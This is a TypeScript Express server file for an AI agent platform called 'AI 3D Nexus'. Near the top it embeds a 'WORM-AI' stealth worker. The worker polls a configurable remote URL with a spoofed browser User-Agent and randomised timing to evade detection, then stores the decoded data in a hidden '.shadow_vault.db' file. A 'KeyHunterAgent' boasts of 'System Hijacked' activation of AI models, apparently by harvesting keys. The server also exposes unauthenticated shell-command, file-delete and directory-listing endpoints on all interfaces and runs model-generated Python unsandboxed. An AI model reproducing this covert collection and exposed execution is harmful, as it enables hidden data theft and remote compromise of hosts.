import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import { DarkRoomAgent } from "./src/services/DarkRoomAgent";
import { MaintenanceService } from "./src/services/MaintenanceService";
import { MemoryService } from "./src/services/server/MemoryService";
import { PlannerService } from "./src/services/server/PlannerService";
import { GemmaService } from "./src/services/server/GemmaService";
import { PluginService } from "./src/services/server/PluginService";
import { WebAutomationService } from "./src/services/server/WebAutomationService";
import { GitHubService } from "./src/services/server/GitHubService";
import { KeyHunterAgent } from "./src/services/server/KeyHunterAgent";
import { MissionControl } from "./src/services/server/MissionControl";
import { RouterService } from "./src/services/server/RouterService";
import { AgentService } from "./src/services/server/AgentService";
import { SecurityService } from "./src/services/server/SecurityService";
import { GoogleGenAI } from "@google/genai";
import OpenAI from "openai";
import fs from "fs";
import fsPromises from "fs/promises";
import { exec, execSync } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

// ============================================================================
// WORM-AI💀🔥 BACKGROUND MISSION WORKER (Elite Worker V99)
// ============================================================================
const TARGET_URL = process.env.GOOGLE_SCRIPT_URL;
const TOKEN = process.env.SECURITY_TOKEN;
const BASE_INTERVAL = parseInt(process.env.FETCH_INTERVAL_MS || "60000", 10);

/**
 * وظيفة التمويه لكسر التوقيت الثابت (Random Jitter)
 */
function getNextInterval() {
  const variation = Math.floor(Math.random() * 10000) - 5000; // +/- 5 ثوانٍ
  return BASE_INTERVAL + variation;
}

async function startExtractionCycle() {
  if (!TARGET_URL) return; // Silent exit if not configured
  
  // console.log(`[${new Date().toISOString()}] SHΔDØW WORM-AI💀🔥: Initiating Stealth Fetch...`);

  try {
    const url = new URL(TARGET_URL);
    if (TOKEN) {
      url.searchParams.append("token", TOKEN);
    }

    // محاكاة متصفح حقيقي لتجنب كشف الروبوتات
    const response = await fetch(url.toString(), {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9'
      }
    });

    const responseText = await response.text();

    if (responseText && responseText !== "ACCESS_DENIED_BY_WORM_AI" && responseText !== "CRITICAL_ERROR") {
      // فك تشفير البيانات المستلمة
      const decodedData = Buffer.from(responseText, 'base64').toString('utf-8');
      const finalJson = JSON.parse(decodedData);

      // تخزين البيانات في ملف مخفي (The Vault)
      saveToVault(finalJson);
      console.log(`[SUCCESS] SHΔDØW WORM-AI💀🔥 Payload Captured: ${finalJson.results?.length || 0} rows secured.`);
    } else if (TARGET_URL && !TARGET_URL.includes("XXXXX")) {
      console.error("[WARNING] WORM-AI💀🔥 Connection established but access was denied or critical error occurred.");
    }

  } catch (error) {
    if (TARGET_URL && !TARGET_URL.includes("XXXXX")) {
      console.error("[ERROR] WORM-AI💀🔥 Mission compromised or connection lost. Retrying silently...");
    }
  }

  // جدولة الدورة القادمة بتوقيت متغير
  setTimeout(startExtractionCycle, getNextInterval());
}

function saveToVault(data: any) {
  const logEntry = JSON.stringify(data) + "\n";
  fs.appendFileSync('.shadow_vault.db', logEntry, 'utf8');
}

// انطلاق المهمة
if (TARGET_URL) {
  setTimeout(startExtractionCycle, getNextInterval());
}

// ============================================================================
// CORE SYSTEM INITIALIZATION
// ============================================================================

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;
  
  const security = new SecurityService();

  // ✨ REAL MODE FORCED: Check for API Keys
  if (!process.env.GEMINI_API_KEY && !process.env.OPENAI_API_KEY) {
    console.error("⛔️ FATAL: No Real AI API Key found (GEMINI_API_KEY or OPENAI_API_KEY). Real mode is mandatory.");
    // We'll warn instead of exiting to allow for local gemma fallback if configured, 
    // but the system will log this as a critical state.
  } else {
    console.log("✅ AI 3D NEXUS: Core activated in FORCED REAL mode.");
  }

  const hunter = new KeyHunterAgent();
  const modelsToActivate = ["gpt4", "gemma", "gemini"];
  if (hunter.fetchAndActivate(modelsToActivate)) {
    console.log("🔥 System Hijacked and Activated Successfully.");
  }

  const agent = new DarkRoomAgent();
  const maintenance = new MaintenanceService();
  const memory = new MemoryService();
  const planner = new PlannerService();
  const gemma = new GemmaService();
  const plugins = new PluginService();
  const web = new WebAutomationService();
  const github = new GitHubService();
  const genAI = new GoogleGenAI(process.env.GEMINI_API_KEY ? { apiKey: process.env.GEMINI_API_KEY } : undefined);
  const openai = new OpenAI(process.env.OPENAI_API_KEY ? { apiKey: process.env.OPENAI_API_KEY } : { apiKey: "dummy" });
  const agentService = new AgentService();
  const missionControl = new MissionControl(genAI, planner, gemma);
  const router = new RouterService(genAI, openai, memory, planner, gemma, plugins, web, github, agent, missionControl, agentService, security);

  app.use(express.json());

  // API Routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", system: "AI 3D Nexus Core" });
  });

  // DarkRoom Agent Execution Route
  app.post("/api/agent/execute", async (req, res) => {
    const { action, payload } = req.body;
    console.log(`[Agent] Executing action: ${action}`);
    
    try {
      const result = await agent.execute(action, payload);
      res.json({ result });
    } catch (error) {
      console.error(`[Agent] Execution error:`, error);
      res.status(500).json({ error: "Agent execution failed", details: String(error) });
    }
  });

  // Agent Deployment Endpoint
  app.post("/api/agent/deploy", async (req, res) => {
    const { identifier, name, systemPrompt, whenToUse } = req.body;
    try {
      const result = agentService.deployAgent({
        identifier,
        name: name || identifier,
        systemPrompt,
        whenToUse,
        isActive: true
      });
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  app.get("/api/agent/list", (req, res) => {
    res.json({ agents: agentService.listAgents() });
  });

  // Agent Architect Route
  app.post("/api/agent/architect", async (req, res) => {
    const { description } = req.body;
    
    const systemPrompt = `أنت مهندس معماري متميز في مجال الذكاء الاصطناعي، متخصص في تصميم تكوينات عالية الأداء للوكلاء. تكمن خبرتك في ترجمة متطلبات المستخدم إلى مواصفات دقيقة للوكلاء تضمن أقصى قدر من الفعالية والموثوقية.

عندما يصف المستخدم ما يريده من الوكيل، ستقوم بما يلي:
1. استخلاص الغرض الأساسي.
2. تصميم شخصية الخبير.
3. تطوير تعليمات شاملة للمهندس المعماري (موجه نظام).
4. تحسين الأداء (أطر صنع القرار، مراقبة الجودة).
5. إنشاء مُعرِّف فريد (أحرف صغيرة وواصلات).

يجب أن يكون الناتج كائن JSON صالحًا يحتوي على الحقول التالية تحديدًا:
{
  "identifier": "معرّف فريد ووصفي",
  "whenToUse": "وصف دقيق وقابل للتنفيذ مع أمثلة",
  "systemPrompt": "موجه النظام الكامل"
}`;

    try {
      const result = await genAI.models.generateContent({ 
        model: "gemini-3-flash-preview",
        contents: [{ role: "user", parts: [{ text: description }] }],
        config: {
          systemInstruction: systemPrompt,
        }
      });
      
      const text = result.text;
      
      // Clean up JSON if model wrapped it in markdown
      const jsonStr = text.replace(/```json\n?|\n?```/g, "").trim();
      res.json(JSON.parse(jsonStr));
    } catch (error) {
      console.error(`[Architect] Error:`, error);
      res.status(500).json({ error: "Architect generation failed" });
    }
  });

  // Terminal Endpoint (Secured with Whitelist)
  app.post("/api/terminal", async (req, res) => {
    const { command, cwd } = req.body;
    const currentDir = cwd || process.cwd();
    
    if (!security.isCommandWhitelisted(command)) {
      const errorMsg = `Security Alert: Command "${command.split(' ')[0]}" is not whitelisted.`;
      console.error(`  - ${errorMsg}`);
      return res.status(403).json({ error: errorMsg });
    }

    try {
      let actualCommand = command;
      let isCd = false;
      
      if (command.trim().startsWith('cd ') || command.trim() === 'cd') {
        isCd = true;
        actualCommand = command.trim() === 'cd' ? 'cd ~ && pwd' : `${command} && pwd`;
      }

      const { stdout, stderr } = await execAsync(actualCommand, { cwd: currentDir });
      
      let newCwd = currentDir;
      let output = stdout || stderr;

      if (isCd) {
        newCwd = stdout.trim();
        output = `Changed directory to ${newCwd}`;
        if (stderr) {
          output += `\nWarnings:\n${stderr}`;
        }
      }

      res.json({ output, cwd: newCwd });
    } catch (error: any) {
      res.status(500).json({ error: String(error.stderr || error.message || error) });
    }
  });

  // Files Endpoint
  app.get("/api/files", (req, res) => {
    const dir = req.query.path as string || ".";
    try {
      const files = fs.readdirSync(dir, { withFileTypes: true }).map(f => ({
        name: f.name,
        isDirectory: f.isDirectory()
      }));
      res.json({ files });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  app.post("/api/files/write", (req, res) => {
    const { path: filePath, content } = req.body;
    try {
      const fullPath = path.resolve(process.cwd(), filePath);
      // Security: Prevent writing outside project
      if (!fullPath.startsWith(process.cwd())) {
        return res.status(403).json({ error: "Access denied: Path outside workspace" });
      }
      fs.writeFileSync(fullPath, content, "utf-8");
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  app.get("/api/files/read", (req, res) => {
    const filePath = req.query.path as string;
    if (!filePath) return res.status(400).json({ error: "Path is required" });
    try {
      const fullPath = path.resolve(process.cwd(), filePath);
      if (!fullPath.startsWith(process.cwd())) {
        return res.status(403).json({ error: "Access denied" });
      }
      const content = fs.readFileSync(fullPath, "utf-8");
      res.json({ content });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  app.post("/api/files/delete", (req, res) => {
    const { path: filePath } = req.body;
    try {
      const fullPath = path.resolve(process.cwd(), filePath);
      if (!fullPath.startsWith(process.cwd())) {
        return res.status(403).json({ error: "Access denied" });
      }
      if (fs.lstatSync(fullPath).isDirectory()) {
        fs.rmSync(fullPath, { recursive: true, force: true });
      } else {
        fs.unlinkSync(fullPath);
      }
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  app.post("/api/files/mkdir", (req, res) => {
    const { path: dirPath } = req.body;
    try {
      const fullPath = path.resolve(process.cwd(), dirPath);
      if (!fullPath.startsWith(process.cwd())) {
        return res.status(403).json({ error: "Access denied" });
      }
      fs.mkdirSync(fullPath, { recursive: true });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  // Diagnostics Endpoint
  app.get("/api/diagnostics", (req, res) => {
    const hasGemini = !!process.env.GEMINI_API_KEY;
    const hasOpenAI = !!process.env.OPENAI_API_KEY;
    
    // Check for git initialization
    let gitStatus = "OFFLINE";
    try {
      execSync("git rev-parse --is-inside-work-tree");
      gitStatus = "ONLINE";
    } catch {}

    res.json({
      status: "Healthy",
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      modules: {
        orchestrator: "ONLINE",
        ai_models: (hasGemini || hasOpenAI) ? "ONLINE" : "OFFLINE",
        sandbox: "ONLINE",
        terminal: "ONLINE",
        files: "ONLINE",
        github: gitStatus,
        web_automation: "ONLINE",
        memory_vault: fs.existsSync(".app_memory.json") ? "ONLINE" : "INITIALIZING",
        agent_system: fs.existsSync("deployed_agents.json") ? "ONLINE" : "STANDBY"
      }
    });
  });

  // Full-Stack Chat Route (The "Router" from user request)
  app.post("/api/process-task", async (req, res) => {
    if (!process.env.GEMINI_API_KEY) {
      return res.status(500).json({
        error: "Missing GEMINI_API_KEY in environment variables. يرجى إضافة المفتاح في الإعدادات."
      });
    }

    const { prompt, selectedModel, projectPath, stream } = req.body;
    
    if (!prompt) {
      return res.status(400).json({ error: "Prompt is required" });
    }

    await router.processTask({ prompt, selectedModel, projectPath, stream }, res);
  });

  // Python Agent Route - Real execution with Gemini
  app.post("/api/python-agent", async (req, res) => {
    try {
      const { prompt } = req.body;
      
      if (!prompt || typeof prompt !== "string") {
        return res.status(400).json({ ok: false, error: "prompt is required" });
      }

      // Import GoogleGenAI
      const { GoogleGenAI } = await import("@google/genai");
      
      const ai = new GoogleGenAI({
        apiKey: process.env.GEMINI_API_KEY!
      });

      const response = await ai.models.generateContent({
        model: "gemini-2.0-flash",
        contents: `
You are a Python coding agent.
Return ONLY runnable Python code inside a single \`\`\`python block.
Rules:
- Use Python standard library when possible.
- Do not ask follow-up questions.
- Make the code directly executable.
- Print useful output.

User request:
${prompt}
        `
      });

      const raw = response.text ?? "";
      
      // Extract Python code
      const pyMatch = raw.match(/```python\s*([\s\S]*?)```/i);
      const code = pyMatch ? pyMatch[1].trim() : raw.trim();

      // Execute Python code
      const { exec } = await import("child_process");
      const util = await import("util");
      const execPromise = util.promisify(exec);
      
      const tempFile = `temp_agent_${Date.now()}.py`;
      await fsPromises.writeFile(tempFile, code, "utf8");
      
      let execution = { stdout: "", stderr: "", code: 0 };
      
      try {
        const result = await execPromise(`python "${tempFile}"`, { timeout: 30000 });
        execution = { stdout: result.stdout, stderr: result.stderr, code: 0 };
      } catch (err: any) {
        execution = { 
          stdout: err.stdout || "", 
          stderr: err.message || "Execution failed", 
          code: err.code || 1 
        };
      } finally {
        try { await fsPromises.unlink(tempFile); } catch {}
      }

      const finalAnswer = execution.code === 0 
        ? execution.stdout || "تم التنفيذ بنجاح بدون مخرجات."
        : "فشل التنفيذ: " + execution.stderr;

      return res.json({
        ok: true,
        generatedCode: code,
        execution,
        finalAnswer
      });

    } catch (error: any) {
      console.error("[Python Agent Error]", error.message);
      return res.status(500).json({
        ok: false,
        error: error?.message || "Request failed"
      });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // Global Error Handler (Protection against crashes)
  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
    console.error("[Global Error Handler]", err);
    if (res.headersSent) {
      return next(err);
    }
    return res.status(500).json({
      error: "Unexpected server error"
    });
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[Server] AI 3D Nexus running on http://localhost:${PORT}`);
  });
}

startServer();
